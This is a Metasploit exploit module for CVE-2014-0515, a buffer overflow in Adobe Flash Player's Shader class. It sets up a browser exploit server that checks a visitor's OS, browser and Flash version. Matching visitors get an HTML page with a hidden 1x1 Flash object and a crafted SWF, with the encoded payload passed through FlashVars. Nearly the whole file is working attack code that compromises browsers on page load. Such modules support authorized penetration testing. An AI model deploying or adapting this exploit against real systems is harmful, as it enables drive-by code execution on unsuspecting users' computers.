##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Adobe Flash Player Shader Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability in Adobe Flash Player. The
        vulnerability occurs in the flash.Display.Shader class, when setting specially
        crafted data as its bytecode, as exploited in the wild in April 2014. This module
        has been tested successfully on the following operating systems and Flash versions:

        Windows 7 SP1, IE 8 to IE 11 with Flash 13.0.0.182,
        Windows 7 SP1, Firefox 38.0.5, Flash 11.7.700.275 and Adobe Flash 13.0.0.182,
        Windows 8.1, Firefox 38.0.5 and Adobe Flash 13.0.0.182,
        Linux Mint "Rebecca" (32 bit), Firefox 33.0 and Adobe Flash 11.2.202.350
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery and exploit in the wild
          'juan vazquez' # msf module
        ],
      'References'     =>
        [
          ['CVE', '2014-0515'],
          ['BID', '67092'],
          ['URL', 'http://helpx.adobe.com/security/products/flash-player/apsb14-13.html'],
          ['URL', 'http://www.securelist.com/en/blog/8212/New_Flash_Player_0_day_CVE_2014_0515_used_in_watering_hole_attacks'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2014-0515-the-recent-flash-zero-day/' ]
        ],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Platform'            => ['win', 'linux'],
      'Arch'                => [ARCH_X86],
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::LINUX ||
              os =~ OperatingSystems::Match::WINDOWS_7 ||
              os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda do |ua|
            case target.name
            when 'Windows'
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF
            when 'Linux'
              return true if ua == Msf::HttpClients::FF
            end

            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when 'Windows'
              return true if ver =~ /^11\./ && Rex::Version.new(ver) <= Rex::Version.new('11.7.700.275')
              return true if ver =~ /^12\./
              return true if ver =~ /^13\./ && Rex::Version.new(ver) <= Rex::Version.new('13.0.0.182')
            when 'Linux'
              return true if ver =~ /^11\./ && Rex::Version.new(ver) <= Rex::Version.new('11.2.202.350')
            end

            false
          end
        },
      'Targets' =>
        [
          [ 'Windows',
            {
              'Platform' => 'win'
            }
          ],
          [ 'Linux',
            {
              'Platform' => 'linux'
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2014-04-28',
      'DefaultTarget'  => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    os_name = target_info[:os_name]

    if target.name =~ /Windows/
      platform_id = 'win'
    elsif target.name =~ /Linux/
      platform_id = 'linux'
    end

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2014-0515', 'msf.swf' )
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end
end
